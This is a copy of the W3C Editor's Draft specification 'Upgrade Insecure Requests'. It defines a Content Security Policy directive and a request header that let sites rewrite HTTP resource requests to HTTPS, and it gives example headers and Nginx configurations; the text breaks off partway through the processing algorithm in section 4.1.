=== Content from w3c.github.io_ae1667dd_20250121_013511.html ===


 [![W3C](https://www.w3.org/StyleSheets/TR/2021/logos/W3C)](https://www.w3.org/)

# Upgrade Insecure Requests

[Editor’s Draft](https://www.w3.org/standards/types#ED), 13 October 2022

More details about this document
This version:
<https://w3c.github.io/webappsec-upgrade-insecure-requests/>
Latest published version:
<http://www.w3.org/TR/upgrade-insecure-requests/>
Previous Versions:
<https://www.w3.org/TR/2015/CR-upgrade-insecure-requests-20151008/>
Version History:
<https://github.com/w3c/webappsec-upgrade-insecure-requests/commits/main/index.bs>
Feedback:
public-webappsec@w3.org with subject line “`[upgrade-insecure-requests] … message topic …`” ([archives](https://lists.w3.org/Archives/Public/public-webappsec/))
Editor:
Carlos Joan Rafael Ibarra Lopez (Google Inc.)
Former Editor:
Mike West (Google Inc.)
Participate:
[File an issue](https://github.com/w3c/webappsec-upgrade-insecure-requests/issues/new) ([open issues](https://github.com/w3c/webappsec-upgrade-insecure-requests/issues))

[Copyright](https://www.w3.org/Consortium/Legal/ipr-notice#Copyright) © 2022 [W3C](https://www.w3.org/)® ([MIT](https://www.csail.mit.edu/), [ERCIM](https://www.ercim.eu/), [Keio](https://www.keio.ac.jp/), [Beihang](https://ev.buaa.edu.cn/)). W3C [liability](https://www.w3.org/Consortium/Legal/ipr-notice#Legal_Disclaimer), [trademark](https://www.w3.org/Consortium/Legal/ipr-notice#W3C_Trademarks) and [permissive document license](https://www.w3.org/Consortium/Legal/2015/copyright-software-and-document) rules apply.

---

## Abstract

This document defines a mechanism which allows authors to instruct a user
agent to upgrade insecure resource requests to secure transport before
fetching them.

## Status of this document

This is a public copy of the editors’ draft.
It is provided for discussion only and may change at any moment.
Its publication here does not imply endorsement of its contents by W3C.
Don’t cite this document other than as work in progress.

**Changes to this document may be tracked at <https://github.com/w3c/webappsec>.**

The ([archived](https://lists.w3.org/Archives/Public/public-webappsec/)) public mailing list public-webappsec@w3.org (see [instructions](https://www.w3.org/Mail/Request))
is preferred for discussion of this specification.
When sending e-mail,
please put the text “upgrade-insecure-requests” in the subject,
preferably like this:
“[upgrade-insecure-requests] *…summary of comment…*”

This document was produced by the [Web Application Security Working Group](https://www.w3.org/groups/wg/webappsec).

This document was produced by a group operating under
the [W3C Patent Policy](https://www.w3.org/Consortium/Patent-Policy/).
W3C maintains a [public list of any patent disclosures](https://www.w3.org/groups/wg/webappsec/ipr) made in connection with the deliverables of the group;
that page also includes instructions for disclosing a patent.
An individual who has actual knowledge of a patent which the individual believes contains [Essential Claim(s)](https://www.w3.org/Consortium/Patent-Policy/#def-essential) must disclose the information in accordance with [section 6 of the W3C Patent Policy](https://www.w3.org/Consortium/Patent-Policy/#sec-Disclosure).

This document is governed by the [2 November 2021 W3C Process Document](https://www.w3.org/2021/Process-20211102/).

## Table of Contents

1. [1 Introduction](#intro)
   1. [1.1 Goals](#goals)- [1.2 Examples](#examples)
        1. [1.2.1 Non-navigational Upgrades](#example-nonnavigational)- [1.2.2 Navigational Upgrades](#example-navigation)- [1.2.3 Failed Upgrade](#example-failed)- [1.3 Recommendations](#recommendations)- [2 Key Concepts and Terminology](#key-concepts)- [3 Upgrading Insecure Resource Requests](#upgrading)
       1. [3.1  The `upgrade-insecure-requests` Content Security Policy directive](#delivery)
          1. [3.1.1 Relation to "Mixed Content"](#mix)- [3.2 Feature Detecting Clients Capable of Upgrading](#feature-detect)
            1. [3.2.1  The `Upgrade-Insecure-Requests` HTTP Request Header Field](#preference)- [3.3 Policy Inheritance](#nesting)- [3.4 Reporting Upgrades](#reporting-upgrades)- [4 Processing Algorithms](#algorithms)
         1. [4.1  Upgrade request to a potentially trustworthy URL, if appropriate](#upgrade-request) - [4.2  Should insecure requests be upgraded for client?](#should-upgrade-for-client)- [5 Security Considerations](#security)
           1. [5.1 Interaction with HSTS](#hsts)- [5.2 CSP Violation Reports](#violation-report-target)- [6 Performance Considerations](#performance)- [7 Authoring Considerations](#authoring)
               1. [7.1 Legacy Clients](#legacy-clients)- [7.2 Relation to HSTS](#relation-to-hsts)- [8 IANA Considerations](#iana-considerations)
                 1. [8.1  Upgrade-Insecure-Requests Header](#iana-https) - [8.2  Upgrade-Insecure-Requests Directive](#iana-directive)- [9 Acknowledgements](#acknowledgements)- [Index](#index)
                     1. [Terms defined by this specification](#index-defined-here)- [Terms defined by reference](#index-defined-elsewhere)- [References](#references)
                       1. [Normative References](#normative)- [Informative References](#informative)

## 1. Introduction

*This section is not normative.*

Increasingly, we encourage authors to transition their sites and applications
away from insecure transport, and onto encrypted and authenticated connections [[WEB-HTTPS]](#biblio-web-https). While this migration has significant advantages for both
authors and users, it isn’t without negative side-effects.

Most notably, mixed content checking [[MIX]](#biblio-mix) has the potential to cause real
headache for administrators tasked with moving substantial amounts of legacy
content onto HTTPS. In particular, going through old content and rewriting
resource URLs manually is a huge undertaking. Moreover, it’s often the case
that truly legacy content is difficult or impossible to update. Consider the
BBC’s archived websites [[BBC-ARCHIVE]](#biblio-bbc-archive), or the New York Times' hard-coded
URLs [[NYT-HTTPS]](#biblio-nyt-https).

We should remove this burden from site authors by allowing them to assert to a
user agent that they intend a site to load only secure resources, and that
insecure URLs ought to be treated as though they had been replaced with equivalent secure
URLs.

This document defines a new Content Security Policy directive, `[upgrade-insecure-requests](#upgrade-insecure-requests)`, through which authors can make
this assertion.
Note: Delivering the policy as a header allows an administrator to easily
opt a set of pages into the upgrade mechanism without touching their source
code individually. The legacy content examples above would not be feasible
with an approach that inlined the policy into HTML, for example.

### 1.1. Goals

The overarching goal is to reduce the burden of migrating websites from
insecure origins by reducing the negative side effects of mixed content
blocking [[MIX]](#biblio-mix).

If we assume that authors do the server-side legwork (obtaining a certificate,
configuring the server, setting up redirects), and that authors also ensure
that both first- and third-party content is accessible at *the same [host](https://url.spec.whatwg.org/#concept-url-host) and [path](https://url.spec.whatwg.org/#concept-url-path)* on a secure [scheme](https://url.spec.whatwg.org/#concept-url-scheme), then the
following statements ought to hold after implementing this feature:

1. Authors should be able to ensure that all content requested by a given
   page loads successfully, and securely. Mixed content blocking should not
   break pages as a result of migrating to a secure origin.

   Note: This requirement is *not* met by Mixed Content’s [strict
   mode](https://w3c.github.io/webappsec/specs/mixedcontent/#strict-mode), which makes something like the opposite assertion.

   - As a result of #1, the user agent should not degrade any security
     indicators related to requesting mixed content, as no insecure content
     should be requested.- Authors should be able to ensure that all internal links correctly send
       users to the site’s secure address, and not to its pre-migration insecure
       address.- Authors should be able to achieve all these goals without editing a site’s
         content. This is particularly important for archived content and legacy
         systems for which maintenance is difficult enough, never mind upgrades.- Authors should be able to pursue a gradual transition from insecure to
           secure, serving secure resources to clients that support upgrades, while
           retaining insecure resources for clients that don’t.

Note: The mechanism defined here does *not* intend to supplant Strict
Transport Security [[RFC6797]](#biblio-rfc6797). See [§ 7.2 Relation to HSTS](#relation-to-hsts) for details.

### 1.2. Examples

#### 1.2.1. Non-navigational Upgrades

 Megacorp, Inc. wishes to migrate `http://example.com/` to `https://example.com`. They set up their servers
to make their own resources available over HTTPS, and work with partners in
order to make third-party widgets available securely as well.

They quickly realize, however, that the majority of their content is locked
up in a database tied to an old content management system, and it contains
hardcoded links to insecure resources (e.g., http:// URLs to images and
other content). Unfortunately, it’s a substantial amount of work to update
it.

As a stopgap measure, Megacorp injects the following header field into every
HTML response that goes out from their servers:

```
[Content-Security-Policy](https://www.w3.org/TR/CSP/#content-security-policy): [upgrade-insecure-requests](#upgrade-insecure-requests)

```

This automatically upgrades all insecure resource requests from their pages
to secure variants, allowing a user agent to treat the following HTML code:

```
<img src="http://example.com/image.png">
<img src="http://not-example.com/image.png">

```

as though it had been delivered as:

```
<img src="https://example.com/image.png">
<img src="https://not-example.com/image.png">

```

The URL will be rewritten before the request is made, meaning that no
insecure requests will hit the network. Users will be safer, and Megacorp’s
administrators will be happier, as all resource requests will be
transparently upgraded with no effort on their part.

#### 1.2.2. Navigational Upgrades

 Megacorp, Inc. isn’t quite ready to deliver Strict Transport Security
headers [[RFC6797]](#biblio-rfc6797), but does want to keep users on secure pages when
possible. Happily, this comes for free with `[upgrade-insecure-requests](#upgrade-insecure-requests)`. That is, they’re already
delivering pages with the following header:
```
[Content-Security-Policy](https://www.w3.org/TR/CSP/#content-security-policy): [upgrade-insecure-requests](#upgrade-insecure-requests)

```

This allows user agents to treat the following HTML code:

```
<a href="http://example.com/">Home</a>

```

as though it had been delivered as:

```
<a href="https://example.com/">Home</a>

```

Links to third-party sites will not be upgraded. That is, the following
HTML code:

```
<a href="http://not-example.com/">Home</a>

```

won’t be upgraded.

#### 1.2.3. Failed Upgrade

 Tinycorp, Inc. enabled `[upgrade-insecure-requests](#upgrade-insecure-requests)` a bit
earlier than they should have, as they don’t actually support HTTPS on `http://cdn.example.com/`. Given the following code:
```
<img src="http://cdn.example.com/image.png">

```

User agents will upgrade requests, as described in [§ 1.2.1 Non-navigational Upgrades](#example-nonnavigational),
rewriting the URL as `https://cdn.example.com/image.png`. As the
server doesn’t respond to secure requests, this results in a network error.

There is no fallback in this scenario: the user agent acts just as though
the request had been intentionally made, and the request fails.

### 1.3. Recommendations

We recommend that authors who wish to ensure that user agents which support [upgrade-insecure-requests](#upgrade-insecure-requests) are as secure as possible do the following:

1. Redirect insecure, [safely upgradable requests](#safely-upgradable-requests) from HTTP to HTTPS by
   responding with a `Location` header and a `307` status code.
    In Nginx, this kind of redirection might look like this:
   ```
   server {
     if ($http_upgrade_insecure_requests = "1") {
       add_header Vary Upgrade-Insecure-Requests;
       return 307 https://$host$request_uri;
     }
   }

   ```

   This is, of course, greatly simplified; your configuration will likely
   be significantly more complex.

   - Respond to [potentially trustworthy URL](https://w3c.github.io/webappsec-secure-contexts/#potentially-trustworthy-url) [safely
     upgradable requests](#safely-upgradable-requests) with a `[upgrade-insecure-requests](#upgrade-insecure-requests)` directive if necessary for the resource being requested.
      In Nginx, adding this directive might look like this:
     ```
     server {
       ...

       add_header [Content-Security-Policy](https://www.w3.org/TR/CSP/#content-security-policy) [upgrade-insecure-requests](#upgrade-insecure-requests);

       ...
     }

     ```

     This is, of course, greatly simplified; your configuration will likely
     be significantly more complex.

     - If the origin is [HSTS-safe](#hsts-safe-origin), then protect
       against SSL-stripping man-in-the-middle attacks by sending a `[Strict-Transport-Security](https://tools.ietf.org/html/rfc6797#section-6.1)` header with the `preload` directive, and ensure that insecure content is
       never loaded by enabling Mixed Content’s [strict mode](https://w3c.github.io/webappsec/specs/mixedcontent/#strict-mode).
        In Nginx, adding this header might look like this (note the use of
       the `preloaded` directive, which signifies that this
       origin’s HSTS state can be safely imported into user agents' HSTS
       preload lists):
       ```
       server {
         ...

         add_header [Strict-Transport-Security](https://tools.ietf.org/html/rfc6797#section-6.1) "max-age=10886400; preload"
         add_header [Content-Security-Policy](https://www.w3.org/TR/CSP/#content-security-policy) [block-all-mixed-content](https://w3c.github.io/webappsec/specs/mixedcontent/#block-all-mixed-content);

         ...
       }

       ```

       This is, of course, greatly simplified; your configuration will likely
       be significantly more complex.

       Additionally, work with user agent vendors to add the origin to
       HSTS Preload Lists (for example, by submitting the origin to [hstspreload.appspot.com](https://hstspreload.appspot.com/)).

       - If the origin is [conditionally HSTS-safe](#conditionally-hsts-safe-origin), then opt-into HSTS only
         in response to [safely upgradable requests](#safely-upgradable-requests).
          In Nginx, adding this header conditionally might look like this (note
         the use of `map`, as setting headers inside `if` without returning immediately is, well, iffy):
         ```
         server {
           ...

           map $http_https $sts {
             "1" "max-age=10886400"
           }

           add_header [Strict-Transport-Security](https://tools.ietf.org/html/rfc6797#section-6.1) $sts;

           ...
         }

         ```

         This is, of course, greatly simplified; your configuration will likely
         be significantly more complex.

## 2. Key Concepts and Terminology

upgrade

A [request](https://fetch.spec.whatwg.org/#concept-request) is said to be **upgraded** if it is rewritten
to contain a URL with a [scheme](https://url.spec.whatwg.org/#concept-url-scheme) of `https` or `wss`.

safely upgradable requests

A [request](https://fetch.spec.whatwg.org/#concept-request) is said to be **safely upgradable** if the [resource representation](https://tools.ietf.org/html/rfc7231#section-3) which will be returned does not require the `[upgrade-insecure-requests](#upgrade-insecure-requests)` mechanism described in this
document to avoid breakage, or if the [request](https://fetch.spec.whatwg.org/#concept-request)'s [header list](https://fetch.spec.whatwg.org/#concept-request-header-list) contains an [`Upgrade-Insecure-Requests` header field](#upgrade-insecure-requests-http-request-header-field) with a value of `1`.

HSTS-safe origin

An [origin](https://tools.ietf.org/html/rfc6454#section-3.2) is said to be **HSTS-safe** if no [resource representations](https://tools.ietf.org/html/rfc7231#section-3) it returns requires the the `[upgrade-insecure-requests](#upgrade-insecure-requests)` mechanism described in
this document to avoid breakage, and if all [resource representations](https://tools.ietf.org/html/rfc7231#section-3) it returns can be served over HTTPS.

[HSTS-safe origins](#hsts-safe-origin) can safely opt-into `[Strict-Transport-Security](https://tools.ietf.org/html/rfc6797#section-6.1)` for all user agents,
without risking broken pages for user agents which do not support `[upgrade-insecure-requests](#upgrade-insecure-requests)`.

conditionally HSTS-safe origin

An [origin](https://tools.ietf.org/html/rfc6454#section-3.2) is said to be **conditionally HSTS-safe** if one or more [resource representations](https://tools.ietf.org/html/rfc7231#section-3) it returns requires the `[upgrade-insecure-requests](#upgrade-insecure-requests)` mechanism described in
this document to avoid breakage, and if all [resource representations](https://tools.ietf.org/html/rfc7231#section-3) it
returns can be served over HTTPS.

[Conditionally HSTS-safe origins](#conditionally-hsts-safe-origin) can safely opt-into `[Strict-Transport-Security](https://tools.ietf.org/html/rfc6797#section-6.1)` only for user agents which
support `[upgrade-insecure-requests](#upgrade-insecure-requests)`.

preloadable HSTS host

A [host](https://url.spec.whatwg.org/#concept-url-host) host is a **preloadable HSTS
host** if, when performing [Known HSTS Host Domain Name
Matching](https://tools.ietf.org/html/rfc6797#section-8.2), host is a [superdomain match](https://tools.ietf.org/html/rfc6797#section-8.2) for a [Known HSTS Host](https://tools.ietf.org/html/rfc6797#section-8.1.1) which asserts both the [includeSubDomains](https://tools.ietf.org/html/rfc6797#section-6.1.2) directive and the `preload` directive, or host is a [congruent match](https://tools.ietf.org/html/rfc6797#section-8.2)for a [Known HSTS Host](https://tools.ietf.org/html/rfc6797#section-8.1.1) which asserts
the `preload` directive.

Note: This is a long way of saying "any host the user agent has pinned
with a `[Strict-Transport-Security](https://tools.ietf.org/html/rfc6797#section-6.1)` header that contained
a `preload` directive".

The Augmented Backus-Naur Form (ABNF) notation used in [§ 3.1 The upgrade-insecure-requests Content Security Policy directive](#delivery) is
specified in RFC5234. [[ABNF]](#biblio-abnf)

## 3. Upgrading Insecure Resource Requests

In order to allow authors to mitigate the negative side-effects of migration
away from insecure origins, authors may instruct the user agent to
transparently upgrade resource requests to [potentially trustworthy URL](https://w3c.github.io/webappsec-secure-contexts/#potentially-trustworthy-url) variants of the original request’s URL.

To support this instruction:

1. [Environment settings objects](https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object) and [browsing contexts](https://html.spec.whatwg.org/multipage/browsers.html#browsing-context) are
   given an insecure requests policy which has two
   potential values Do Not
   Upgrade and Upgrade. It is
   set to [Do Not Upgrade](#valdef-insecure-requests-policy-do-not-upgrade) unless otherwise specified. This policy
   is checked in [§ 4.1 Upgrade request to a potentially trustworthy URL, if appropriate](#upgrade-request) in order to determine whether or not
   non-navigation requests and form submissions should be upgraded during [fetching](https://fetch.spec.whatwg.org/#concept-fetch).- [Environment settings objects](https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object) and [browsing contexts](https://html.spec.whatwg.org/multipage/browsers.html#browsing-context) are
     given an upgrade insecure navigations set which
     contains a set of ([host](https://url.spec.whatwg.org/#concept-url-host), [port](https://url.spec.whatwg.org/#concept-url-port)) tuples to which navigations
     ought to be upgraded. Its value is the empty set unless otherwise
     specified. This set is checked in [§ 4.1 Upgrade request to a potentially trustworthy URL, if appropriate](#upgrade-request) in order to
     determine whether or not [navigation requests](https://fetch.spec.whatwg.org/#navigation-request) should be upgraded.

### 3.1. The `upgrade-insecure-requests` Content Security Policy directive

**✔**MDN

[Headers/Content-Security-Policy/upgrade-insecure-requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/upgrade-insecure-requests "The HTTP Content-Security-Policy (CSP) upgrade-insecure-requests directive instructs user agents to treat all of a site's insecure URLs (those served over HTTP) as though they have been replaced with secure URLs (those served over HTTPS). This directive is intended for web sites with large numbers of insecure legacy URLs that need to be rewritten.")

In all current engines.

Firefox42+Safari10.1+Chrome43+

---

Opera?Edge79+

---

Edge (Legacy)17+IENone

---

Firefox for Android?iOS Safari?Chrome for Android?Android WebView?Samsung Internet?Opera Mobile?

A server MAY instruct a user agent to upgrade insecure requests for a
particular [protected resource](https://www.w3.org/TR/CSP/#protected-resource) by sending a `[Content-Security-Policy](https://www.w3.org/TR/CSP/#content-security-policy)` header [[CSP]](#biblio-csp) that contains a upgrade-insecure-requests directive, defined via the
following ABNF grammar:

```
directive-name  = "upgrade-insecure-requests"
directive-value = ""

```

When [enforcing](https://www.w3.org/TR/CSP/#enforce) the `upgrade-insecure-requests` directive:

1. Let settings be the [protected resource](https://www.w3.org/TR/CSP/#protected-resource)’s [incumbent
   settings object](https://html.spec.whatwg.org/multipage/webappapis.html#incumbent-settings-object).- Set settings’s [insecure requests policy](#insecure-requests-policy) to [Upgrade](#valdef-insecure-requests-policy-upgrade).- Let tuple be a tuple of the [protected resource](https://www.w3.org/TR/CSP/#protected-resource)’s [URL](https://url.spec.whatwg.org/#concept-url)'s [host](https://url.spec.whatwg.org/#concept-url-host) and [port](https://url.spec.whatwg.org/#concept-url-port).- Insert tuple into settings’s [upgrade insecure
         navigations set](#upgrade-insecure-navigations-set).

[Monitoring](https://www.w3.org/TR/CSP/#monitor) the `upgrade-insecure-requests` directive has
no effect: the directive is ignored when sent via a `[Content-Security-Policy-Report-Only](https://www.w3.org/TR/CSP/#content-security-policy-report-only)` header. Authors can
determine whether or not upgraded resources' original URLs
were insecure via `[Content-Security-Policy-Report-Only](https://www.w3.org/TR/CSP/#content-security-policy-report-only)`. For
example, `[Content-Security-Policy-Report-Only](https://www.w3.org/TR/CSP/#content-security-policy-report-only):
default-src https:; report-uri /endpoint`. See [§ 3.4 Reporting Upgrades](#reporting-upgrades) for additional detail.

#### 3.1.1. Relation to "Mixed Content"

The `[upgrade-insecure-requests](#upgrade-insecure-requests)` directive results in
requests being rewritten at the top of the [Fetching](https://fetch.spec.whatwg.org/#concept-fetch) algorithm [[FETCH]](#biblio-fetch), as specified in [§ 4.1 Upgrade request to a potentially trustworthy URL, if appropriate](#upgrade-request). It’s important to note that
the rewrite happens *before* either Mixed Content [[MIX]](#biblio-mix) or Content
Security Policy checks take effect [[CSP]](#biblio-csp).

This ordering means that upgraded requests *will not* be flagged as
mixed content. Moreover, it means that `[upgrade-insecure-requests](#upgrade-insecure-requests)`’s effect takes place before
the `[block-all-mixed-content](https://w3c.github.io/webappsec/specs/mixedcontent/#block-all-mixed-content)` directive would have a chance
to block the request. If the former is set, the latter is effectively a no-op.

We recommend that authors set one directive or the other, as outlined in [§ 1.3 Recommendations](#recommendations).

### 3.2. Feature Detecting Clients Capable of Upgrading

Sites which require the upgrade mechanism laid out in this document in order
to provide users with a reasonable experience over secure transit need some
way to determine whether or not a particular [request](https://fetch.spec.whatwg.org/#concept-request) can safely be
redirected from HTTP to HTTPS (and vice-versa). Moreover, [conditionally
HSTS-safe origins](#conditionally-hsts-safe-origin) can only opt-into `[Strict-Transport-Security](https://tools.ietf.org/html/rfc6797#section-6.1)` for supported user agents, and
doing otherwise could have negative consequences for the site’s users.

Rather than relying on user-agent sniffing to make this decision, user agents
can advertise their upgrade capability when making [navigation requests](https://fetch.spec.whatwg.org/#navigation-request) by including an [`Upgrade-Insecure-Requests` header field](#upgrade-insecure-requests-http-request-header-field) as
described in [§ 3.2.1 The Upgrade-Insecure-Requests HTTP Request Header Field](#preference).

#### 3.2.1. The `Upgrade-Insecure-Requests` HTTP Request Header Field

**✔**MDN

[Headers/Upgrade-Insecure-Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Upgrade-Insecure-Requests "The HTTP Upgrade-Insecure-Requests request header sends a signal to the server expressing the client's preference for an encrypted and authenticated response, and that it can successfully handle the upgrade-insecure-requests CSP directive.")

In all current engines.

Firefox48+Safari10.1+Chrome44+

---

Opera?Edge79+

---

Edge (Legacy)17+IENone

---

Firefox for Android?iOS Safari?Chrome for Android?Android WebView?Samsung Internet?Opera Mobile?

The  `Upgrade-Insecure-Requests` HTTP request header
field sends a signal to the server expressing the client’s preference
for an encrypted and authenticated response, and that it can successfully
handle the `[upgrade-insecure-requests](#upgrade-insecure-requests)` directive in order
to make that preference as seamless as possible to provide.

This preference is represented by the following ANBF:

```
"Upgrade-Insecure-Requests:" *[WSP](https://tools.ietf.org/html/rfc5234#appendix-B.1) "1" *[WSP](https://tools.ietf.org/html/rfc5234#appendix-B.1)

```

Note: Though the `Upgrade-Insecure-Requests` header expresses a
preference, sending it via the existing `[Prefer](https://tools.ietf.org/html/rfc7240#section-2)` header is
problematic, as we expect the response from the server to use it as part of
the cache key. `Vary: Prefer` is too broad, as discussed in [w3/webappsec#216](https://github.com/w3c/webappsec/issues/216).

User agent conformance details are described in step #1 of the the [§ 4.1 Upgrade request to a potentially trustworthy URL, if appropriate](#upgrade-request) algorithm. That step represents the following
requirements:

1. User agents MUST send an [`Upgrade-Insecure-Requests` header
   field](#upgrade-insecure-requests-http-request-header-field) along with [request](https://fetch.spec.whatwg.org/#concept-request)s for insecure URLs.

   Note: Servers can use this signal to upgrade HTTP requests to HTTPS for
   pages that require `[upgrade-insecure-requests](#upgrade-insecure-requests)` support.

   - User agents MUST send an [`Upgrade-Insecure-Requests` header
     field](#upgrade-insecure-requests-http-request-header-field) along with [request](https://fetch.spec.whatwg.org/#concept-request)s for [potentially trustworthy URLs](https://w3c.github.io/webappsec-secure-contexts/#potentially-trustworthy-url) whose [URL](https://fetch.spec.whatwg.org/#concept-request-url)'s [host](https://url.spec.whatwg.org/#concept-url-host) is *not* a [preloadable HSTS host](#preloadable-hsts-host).

     Note: Servers can use the absence of this signal to downgrade HTTPS
     requests to HTTP for pages that require `[upgrade-insecure-requests](#upgrade-insecure-requests)` support.

     - User agents SHOULD periodically send an [`Upgrade-Insecure-Requests` header field](#upgrade-insecure-requests-http-request-header-field) along with [request](https://fetch.spec.whatwg.org/#concept-request)s for [potentially trustworthy URLs](https://w3c.github.io/webappsec-secure-contexts/#potentially-trustworthy-url) whose [URL](https://fetch.spec.whatwg.org/#concept-request-url)'s [host](https://url.spec.whatwg.org/#concept-url-host) *is* a [preloadable HSTS host](#preloadable-hsts-host). For example, user agents could send an [`Upgrade-Insecure-Requests` header field](#upgrade-insecure-requests-http-request-header-field) only when
       the asserted `max-age` is a few days from expiration, or
       only for a small percentage of requests.

       Note: [preloadable HSTS hosts](#preloadable-hsts-host) have asserted that they are [HSTS-safe](#hsts-safe-origin), and therefore don’t need a downgrade signal. They will
       need to refresh HSTS status before the asserted `max-age` expires, and the [`Upgrade-Insecure-Requests` header
       field](#upgrade-insecure-requests-http-request-header-field) serves as a fine signal that HSTS could be refreshed.

When a server encounters this preference in an HTTP request’s headers, it
SHOULD redirect the user to a [potentially trustworthy URL](https://w3c.github.io/webappsec-secure-contexts/#potentially-trustworthy-url) variant
of the resource being requested.

When a server encounters this preference in an HTTPS request’s headers,
it SHOULD include a `[Strict-Transport-Security](https://tools.ietf.org/html/rfc6797#section-6.1)` header in
the response if the request’s [host](https://url.spec.whatwg.org/#concept-url-host) is [HSTS-safe](#hsts-safe-origin) or [conditionally HSTS-safe](#conditionally-hsts-safe-origin) [[RFC6797]](#biblio-rfc6797).

 A client that supports this document’s upgrade mechanism requests `http://example.com/` as follows:
```
GET / HTTP/1.1
Host: example.com
[Upgrade-Insecure-Requests](#upgrade-insecure-requests-http-request-header-field): 1

```

The server parses the preference, notices that the user’s client can deal
well with upgrade requests, and therefore responds to the request by
redirecting the user to a secure version of the resource she’s requesting:

```
HTTP/1.1 307 Moved Temporarily
Location: https://example.com/
[Vary](https://tools.ietf.org/html/rfc7231#section-7.1.4): [Upgrade-Insecure-Requests](#upgrade-insecure-requests-http-request-header-field)

```

The [`Upgrade-Insecure-Requests` header field](#upgrade-insecure-requests-http-request-header-field) is listed in the [`Vary`](https://tools.ietf.org/html/rfc7231#section-7.1.4) header, as the
redirect response might otherwise be served by caches to clients that
don’t support the upgrade mechanism defined here. A similar effect could be
achieved by making this redirect response uncachable via the [`Cache-Control`](https://tools.ietf.org/html/rfc7234#section-5.2) header:

```
HTTP/1.1 307 Moved Temporarily
Location: https://example.com/
[Cache-Control](https://tools.ietf.org/html/rfc7234#section-5.2): [no-store](https://tools.ietf.org/html/rfc7234#section-5.2.2.3)

```
### 3.3. Policy Inheritance

If a `[Document](http://www.w3.org/TR/dom/#interface-document)`'s [incumbent settings object](https://html.spec.whatwg.org/multipage/webappapis.html#incumbent-settings-object)’s [insecure requests
policy](#insecure-requests-policy) is set to [Upgrade](#valdef-insecure-requests-policy-upgrade), the user agent MUST ensure that
all [nested browsing contexts](https://html.spec.whatwg.org/multipage/browsers.html#nested-browsing-context) inherit the setting in the following ways:

1. When a [nested browsing context](https://html.spec.whatwg.org/multipage/browsers.html#nested-browsing-context) context is created:
   1. If context’s [embedding document](https://w3c.github.io/webappsec-mixed-content/#embedding-document)’s [insecure
      requests policy](#insecure-requests-policy) is [Upgrade](#valdef-insecure-requests-policy-upgrade), then:
      1. Set context’s [insecure requests policy](#insecure-requests-policy) to [Upgrade](#valdef-insecure-requests-policy-upgrade).- For each value in context’s [embedding
           document](https://w3c.github.io/webappsec-mixed-content/#embedding-document)’s [upgrade insecure navigations set](#upgrade-insecure-navigations-set), add value to context’s [upgrade insecure
           navigations set](#upgrade-insecure-navigations-set).- When [creating a new `Document` object](https://html.spec.whatwg.org/multipage/browsers.html#create-a-document-object) document in a [browsing context](https://html.spec.whatwg.org/multipage/browsers.html#browsing-context) context:
     1. If context’s [insecure requests policy](#insecure-requests-policy) is [Upgrade](#valdef-insecure-requests-policy-upgrade), then:
        1. Let settings be document’s [incumbent
           settings object](https://html.spec.whatwg.org/multipage/webappapis.html#incumbent-settings-object).- Set settings’ [insecure requests policy](#insecure-requests-policy) to [Upgrade](#valdef-insecure-requests-policy-upgrade).- For each value in context’s [upgrade
               insecure navigations set](#upgrade-insecure-navigations-set), add value to settings’s [upgrade insecure navigations set](#upgrade-insecure-navigations-set).

Likewise, when spinning up a worker, the user agent MUST ensure that it
inherits the setting from the context that created it in the following ways:

1. When executing the [set up a worker environment settings object](http://www.w3.org/TR/workers/#script-settings-for-workers) algorithm, perform the following steps after the current step #4:
   5. If inherited responsible browsing context’s [insecure
      requests policy](#insecure-requests-policy) is [Upgrade](#valdef-insecure-requests-policy-upgrade), then:
      1. Set settings object’s [insecure requests policy](#insecure-requests-policy) to [Upgrade](#valdef-insecure-requests-policy-upgrade).- For each value in inherited responsible browsing
           context’s [upgrade insecure navigations set](#upgrade-insecure-navigations-set), add value to settings object’s [upgrade
           insecure navigations set](#upgrade-insecure-navigations-set).

### 3.4. Reporting Upgrades

Upgrading insecure requests MUST not interfere with an authors' ability to
track down requests that would be insecure in a user agent that does not
support upgrades. To that end, upgrades MUST be performed *after* evaluating request against all [monitored](https://www.w3.org/TR/CSP/#monitor) security policies,
but *before* evaluating request against all [enforced](https://www.w3.org/TR/CSP/#enforce) policies.

 Within the context of a [protected resource](https://www.w3.org/TR/CSP/#protected-resource) which contains the
insecure image `<img src="http://example.com/image.png">`,
and delivers the following HTTP headers:
```
[Content-Security-Policy](https://www.w3.org/TR/CSP/#content-security-policy): [upgrade-insecure-requests](#upgrade-insecure-requests); [default-src](https://www.w3.org/TR/CSP/#default-src) https:
[Content-Security-Policy-Report-Only](https://www.w3.org/TR/CSP/#content-security-policy-report-only): [default-src](https://www.w3.org/TR/CSP/#default-src) https:; [report-uri](https://www.w3.org/TR/CSP/#report-uri) /endpoint

```

The user agent will fire off a [request](https://fetch.spec.whatwg.org/#concept-request) request that:

1. Violates the policy being [monitored](https://www.w3.org/TR/CSP/#monitor), thereby delivering a [violation report](https://www.w3.org/TR/CSP/#example-violation-report) to `/endpoint`.- Is upgraded from `http://example.com/image.png` to `https://example.com/image.png`.- Does not violate the policy being [enforced](https://www.w3.org/TR/CSP/#enforce).

Note: This will be significantly clarified once [[CSP]](#biblio-csp) is rewritten in terms
of [[FETCH]](#biblio-fetch).

## 4. Processing Algorithms

### 4.1. Upgrade request to a [potentially trustworthy URL](https://w3c.github.io/webappsec-secure-contexts/#potentially-trustworthy-url), if appropriate

Given a [request](https://fetch.spec.whatwg.org/#concept-request) request, this algorithm will rewrite its [URL](https://fetch.spec.whatwg.org/#concept-request-url) if the [client](https://fetch.spec.whatwg.org/#concept-request-client) from which the request originates
has opted-in to upgrades. It will also inject an [`Upgrade-Insecure-Requests` header field](#upgrade-insecure-requests-http-request-header-field) header for
insecure [navigation requests](https://fetch.spec.whatwg.org/#navigation-request) in order to improve a server’s ability to
feature-detect a client’s upgrade capabilities.

We will not upgrade cross-origin [navigation requests](https://fetch.spec.whatwg.org/#navigation-request), with the
exception of form submissions. Form submissions will be upgraded to mitigate
the risk of data leakage via plaintext submissions.

Note: This algorithm is called at the top of the [Main Fetch](https://fetch.spec.whatwg.org/#main-fetch) algorithm.

1. If request is a [navigation request](https://fetch.spec.whatwg.org/#navigation-request), [append](https://fetch.spec.whatwg.org/#concept-header-list-append) a
   header named `Upgrade-Insecure-Requests` with a value of `1` to request’s [header list](https://fetch.spec.whatwg.org/#concept-request-header-list) if any of the following
   criteria are met:
